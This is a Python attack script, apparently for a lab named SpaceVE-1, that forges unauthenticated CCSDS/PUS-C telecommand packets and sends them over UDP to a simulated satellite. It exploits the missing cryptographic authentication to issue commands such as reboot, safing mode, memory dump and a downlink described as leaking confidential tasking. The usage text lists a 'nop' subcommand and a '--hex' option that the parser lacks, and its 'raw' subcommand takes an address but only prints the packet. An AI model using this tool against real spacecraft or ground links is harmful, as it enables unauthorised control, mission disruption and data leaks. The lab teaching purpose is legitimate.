#!/usr/bin/env python3
"""
ccsds_packet_forge.py — CCSDS Space Packet Forger
SpaceVE-1 Lab Attack Tool

Builds syntactically valid CCSDS Space Packet Protocol (SPP) packets
without any authentication token. Demonstrates the core misconfiguration:
CCSDS checksum validates INTEGRITY (no corruption) but not AUTHENTICITY
(anyone who can compute XOR can forge commands).

Usage:
  python3 ccsds_packet_forge.py nop
  python3 ccsds_packet_forge.py send --cmd nop --ip 192.168.61.100 --port 1234
  python3 ccsds_packet_forge.py send --cmd camera_on
  python3 ccsds_packet_forge.py send --cmd downlink_on
  python3 ccsds_packet_forge.py send --cmd memory_dump
  python3 ccsds_packet_forge.py raw --hex 1A00C0000001 --func 0x02
  python3 ccsds_packet_forge.py list

CCSDS Primary Header (6 bytes):
  Bits 0-2:  Version (000)
  Bit  3:    Type    (1=command, 0=telemetry)
  Bit  4:    Sec Hdr Flag (1=secondary header present)
  Bits 5-15: APID (11 bits, identifies destination app)
  Bits 16-17: Sequence flags (11=standalone)
  Bits 18-31: Sequence count (14 bits)
  Bits 32-47: Data length (payload length - 1)

PUS-C TC Secondary Header (7 bytes, ECSS-E-ST-70-41C):
  Byte 0:    PUS version + ack flags (0x21 for PUS-C with acceptance ack)
  Byte 1:    Service type (128 = mission cmd)
  Byte 2:    Service subtype (1)
  Bytes 3-4: Source ID (big-endian, 0x0001)
  Byte 5:    Function code
  Byte 6:    Checksum (XOR of 0xFF with all preceding secondary bytes)

Attack vector: No cryptographic MAC. The checksum is deterministic and
computable by any attacker. Source IP is not verified by the satellite.
"""

import argparse
import socket
import struct
import sys

# PUS-C TC secondary header constants
_PUS_VER    = 0x20   # version bits 7:4 = 0b0010 (PUS-C)
_ACK_ACCEPT = 0x01   # acceptance verification only


SATELLITE_APID = 0x200  # SpaceVE-1 primary app ID

# Function codes for SpaceVE-1 satellite (PUS-C TC[128,1])
COMMANDS = {
    "nop":                     (0x00, b""),
    "camera_on":               (0x01, b""),
    "camera_off":              (0x02, b""),
    "downlink_on":             (0x03, b""),
    "downlink_off":            (0x04, b""),
    "memory_dump":             (0x05, b""),
    "reboot":                  (0x06, b""),
    "safing_mode":             (0x07, b""),
    "nominal_mode":            (0x08, b""),
    "mission_downlink_enable": (0x0B, b""),
    "mission_downlink_disable":(0x0C, b""),
}


def ccsds_checksum(sec_byte0: int, user_data: bytes) -> int:
    cksum = 0xFF
    cksum ^= sec_byte0
    for b in user_data:
        cksum ^= b
    return cksum


def build_pus_packet(apid: int, func_code: int, seq: int = 0,
                     svc_type: int = 128, svc_subtype: int = 1,
                     source_id: int = 0x0001) -> bytes:
    """
    Build a PUS-C TC packet (ECSS-E-ST-70-41C).
    Secondary header: pus_ver_ack(1) + svc_type(1) + svc_subtype(1) + source_id(2)
    Application data: func_code(1) + checksum(1)
    Total secondary section: 7 bytes -> data_len = 6
    """
    word0     = (0b000 << 13) | (1 << 12) | (1 << 11) | (apid & 0x7FF)
    word1     = (0b11 << 14) | (seq & 0x3FFF)
    primary   = struct.pack(">HHH", word0, word1, 6)
    pus_ver_ack = (_PUS_VER & 0xF0) | (_ACK_ACCEPT & 0x0F)
    hdr       = struct.pack(">BBBH", pus_ver_ack, svc_type, svc_subtype, source_id)
    ck = 0xFF
    for b in hdr:
        ck ^= b
    ck ^= func_code
    secondary = hdr + bytes([func_code, ck])
    return primary + secondary


def build_packet(apid: int, func_code: int, user_data: bytes = b"", seq: int = 0) -> bytes:
    word0 = (0b000 << 13) | (1 << 12) | (1 << 11) | (apid & 0x7FF)
    word1 = (0b11 << 14) | (seq & 0x3FFF)
    data_len = 1 + len(user_data)  # secondary header + user data, minus 1

    primary = struct.pack(">HHH", word0, word1, data_len)

    sec_byte0 = (func_code & 0x7F) << 1
    cksum = ccsds_checksum(sec_byte0, user_data)
    secondary = bytes([sec_byte0, cksum])

    return primary + secondary + user_data


def parse_packet(data: bytes) -> dict:
    if len(data) < 6:
        return {"error": "too short"}
    word0, word1, data_len = struct.unpack(">HHH", data[:6])
    version    = (word0 >> 13) & 0x7
    pkt_type   = (word0 >> 12) & 0x1
    sec_hdr    = (word0 >> 11) & 0x1
    apid       = word0 & 0x7FF
    seq_flags  = (word1 >> 14) & 0x3
    seq_count  = word1 & 0x3FFF
    result = {
        "version": version,
        "type": "command" if pkt_type else "telemetry",
        "sec_hdr": bool(sec_hdr),
        "apid": f"0x{apid:03X}",
        "seq_flags": seq_flags,
        "seq_count": seq_count,
        "data_len_field": data_len,
        "total_bytes": len(data),
    }
    if pkt_type and sec_hdr and len(data) >= 8:
        sec_byte0 = data[6]
        stored_cksum = data[7]
        func_code = (sec_byte0 >> 1) & 0x7F
        user_data = data[8:]
        computed_cksum = ccsds_checksum(sec_byte0, user_data)
        result["func_code"] = f"0x{func_code:02X}"
        result["checksum_stored"] = f"0x{stored_cksum:02X}"
        result["checksum_computed"] = f"0x{computed_cksum:02X}"
        result["checksum_valid"] = stored_cksum == computed_cksum
    return result


def cmd_list(args):
    print("\n  CCSDS SpaceVE-1 Command Reference")
    print("  ====================================")
    print(f"  Satellite APID: 0x{SATELLITE_APID:03X}")
    print()
    print(f"  {'Name':<15} {'Func Code':<12} {'Effect'}")
    print(f"  {'-'*15} {'-'*12} {'-'*40}")
    effects = {
        "nop":                     "No operation",
        "camera_on":               "Enable imaging payload",
        "camera_off":              "Disable imaging payload",
        "downlink_on":             "Enable TLM downlink",
        "downlink_off":            "Disable TLM downlink",
        "memory_dump":             "Dump onboard memory to TLM",
        "reboot":                  "Force satellite reboot",
        "safing_mode":             "Put satellite into SAFE mode (mission impact)",
        "nominal_mode":            "Return satellite to NOMINAL mode",
        "mission_downlink_enable": "Enable mission data downlink (leaks CONFIDENTIAL tasking)",
        "mission_downlink_disable":"Disable mission data downlink",
    }
    for name, (fc, _) in COMMANDS.items():
        pkt = build_pus_packet(SATELLITE_APID, fc)
        print(f"  {name:<15} 0x{fc:02X}         {effects.get(name, '')}")
        print(f"  {'':15} {'hex:':<12} {pkt.hex()}")
    print()


def cmd_forge(args):
    if args.cmd not in COMMANDS:
        print(f"Unknown command: {args.cmd}. Use 'list' to see options.")
        sys.exit(1)
    func_code, _ = COMMANDS[args.cmd]
    pkt = build_pus_packet(SATELLITE_APID, func_code)
    print(f"\n  Forged PUS-C TC[128,1] packet: {pkt.hex()}")
    info = parse_packet(pkt)
    for k, v in info.items():
        print(f"    {k}: {v}")
    print()
    return pkt


def cmd_send(args):
    if args.cmd not in COMMANDS:
        print(f"Unknown command: {args.cmd}")
        sys.exit(1)
    func_code, _ = COMMANDS[args.cmd]
    pkt = build_pus_packet(SATELLITE_APID, func_code)
    fmt = "PUS-C TC[128,1]"
    print(f"\n  Sending '{args.cmd}' (func=0x{func_code:02X}) [{fmt}] to {args.ip}:{args.port}")
    print(f"  Packet ({len(pkt)} bytes): {pkt.hex()}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(pkt, (args.ip, args.port))
    sock.close()
    print(f"  Sent. No authentication required.\n")


def cmd_raw(args):
    apid = int(args.apid, 16) if hasattr(args, 'apid') and args.apid else SATELLITE_APID
    func = int(args.func, 16) if args.func else 0
    data = bytes.fromhex(args.data) if hasattr(args, 'data') and args.data else b""
    pkt = build_packet(apid, func, data)
    print(f"\n  Raw packet (APID=0x{apid:03X}, func=0x{func:02X}): {pkt.hex()}\n")


def main():
    p = argparse.ArgumentParser(description="CCSDS packet forger for SpaceVE-1 lab")
    sub = p.add_subparsers(dest="action")

    sub.add_parser("list", help="List available commands")

    forge_p = sub.add_parser("forge", help="Build and display a packet")
    forge_p.add_argument("--cmd", default="nop", choices=COMMANDS.keys())

    send_p = sub.add_parser("send", help="Build and send a packet")
    send_p.add_argument("--cmd", default="nop", choices=COMMANDS.keys())
    send_p.add_argument("--ip", default="192.168.61.100",
                        help="Satellite IP (192.168.61.100/101/102 on cmd network)")
    send_p.add_argument("--port", type=int, default=1234)

    raw_p = sub.add_parser("raw", help="Send custom APID/func code packet")
    raw_p.add_argument("--apid", default=f"0x{SATELLITE_APID:X}")
    raw_p.add_argument("--func", default="0x00")
    raw_p.add_argument("--data", default="")
    raw_p.add_argument("--ip", default="192.168.61.100")
    raw_p.add_argument("--port", type=int, default=1234)

    args = p.parse_args()
    if args.action == "list":
        cmd_list(args)
    elif args.action == "forge":
        cmd_forge(args)
    elif args.action == "send":
        cmd_send(args)
    elif args.action == "raw":
        cmd_raw(args)
    else:
        p.print_help()


if __name__ == "__main__":
    main()
